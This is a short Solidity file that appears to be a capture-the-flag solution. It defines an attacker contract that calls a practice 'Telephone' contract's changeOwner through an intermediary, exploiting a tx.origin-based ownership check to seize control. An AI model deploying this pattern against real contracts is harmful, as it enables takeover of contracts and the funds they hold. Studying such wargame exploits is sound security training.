// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Telephone} from "../Telephone.sol";

contract TelephoneAttacker {
    address public owner;
    Telephone public telephone;

    constructor(Telephone _telephone) {
        telephone = _telephone;
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function callTelephone() public onlyOwner {
        telephone.changeOwner(msg.sender);
    }
}
